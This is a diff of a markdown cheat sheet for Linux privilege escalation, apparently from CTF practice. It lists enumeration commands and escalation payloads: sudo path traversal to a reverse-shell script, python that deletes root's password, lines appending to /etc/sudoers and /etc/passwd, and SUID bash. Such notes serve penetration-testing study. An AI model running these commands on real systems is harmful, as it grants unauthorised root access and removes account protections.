@@ -15,32 +15,37 @@ ___
 
 ## Description:  
 Auto enumeration with [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
-### useful enumeration
 
-users
+### useful enumeration
+**users**
 `cat /etc/passwd`
 
-**What commands can the user execute with sudo?
+**What commands can the user execute with sudo?**
 `sudo -l
+Is there a * in the command and can you run --help?
+https://gtfobins.github.io/gtfobins/less/
+Can you pass environment variables?
+a way around the minimized restriction when you have * in the command
+
 look for wildcards to run anything or try path traversal
 `(ALL) /usr/bin/node /usr/local/scripts/*.js`
 means this will work:
 `sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/rev.js`
 
-**check for mail
+**check for mail**
 `ls /var/mail/`
 
-**What is the kernel version and architecture type?
+**What is the kernel version and architecture type?**
 `uname -a
 `uname -r
 
-**What is the OS version
+**What is the OS version**
 `cat /etc/*-release
 kernel modules
 `lsmod`
 `/sbin/modinfo libata`
 
-**What languages are installed?
+**What languages are installed?**
 `man -k language
 `which gcc
 `which g++
@@ -50,30 +55,30 @@ ps aux
 
 **Run pspy64 on the machine to get the process run by root.**
 
-**What are the SUID/GUID binaries?
+**What are the SUID/GUID binaries?**
 ``find / -perm -u=s -type f 2>/dev/null
 ``find / -perm -g=s -type f 2>/dev/null
 
 look for vulnerable programs that run as root
 [gtfobins](https://gtfobins.github.io/)
 
-**Are there world writable files?
+**Are there world writable files?**
 `find / -writable -type d 2>/dev/null
 
-**What have users been doing? Command history?
+**What have users been doing? Command history?**
 `history
 ``.bash_history
 
-**Are there any plaintext credentials to be found?
+**Are there any plaintext credentials to be found?**
 `find . -type f | xargs grep –i “password”
 `grep –r . –e “password” 2>/dev/null
 
-**What jobs are scheduled?
+**What jobs are scheduled?**
 `crontab -l
 l`s -lah /etc/cron* 2>/dev/null
 `cat /etc/crontab`
 
-networking
+**networking**
 `netstat -tulpn`
 `/sbin/route`
 `ss -anp`
@@ -83,12 +88,12 @@ networking
 **applications installed**
 `dpkg -l`
 
-**unmounted disks
+**unmounted disks**
 `cat /etc/fstab`
 `mount`
 `/bin/lsblk`
 
-**What processes and services are running?  Which are running as root?
+**What processes and services are running?  Which are running as root?**
 `ps –ef
 `ps –ef | grep root
 
@@ -102,19 +107,19 @@ or
 `echo "import os;os.system(\"passwd -d root\")" > bash.py`
 
 
-**Scripts that can be used if they run as root:
+**Scripts that can be used if they run as root:**
 `echo “user ALL=(ALL) NOPASSWD:ALL” >> /etc/sudoers
 `echo “user::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd
 `bash -i
 
-**Editing the Sudoers file to give root
+**Editing the Sudoers file to give root**
 change:
 `loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht 
 To:
 `loneferret ALL=NOPASSWD: /bin/su, /usr/local/bin/ht 
 `loneferret@Kioptrix3:~$ sudo /bin/su 
 
-**Can you set a SUID on bash?
+**Can you set a SUID on bash?**
 `chmod +s /bin/bash`
 `/bin/bash -p`
 
@@ -176,7 +181,7 @@ id
 uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
 
 ```
-**Can you use command concatenation with && /bin/sh or &&/bin/bash?
+**Can you use command concatenation with && /bin/sh or &&/bin/bash?**
 
 ```
 mike@pwnlab:/home/mike$ ./msg2root
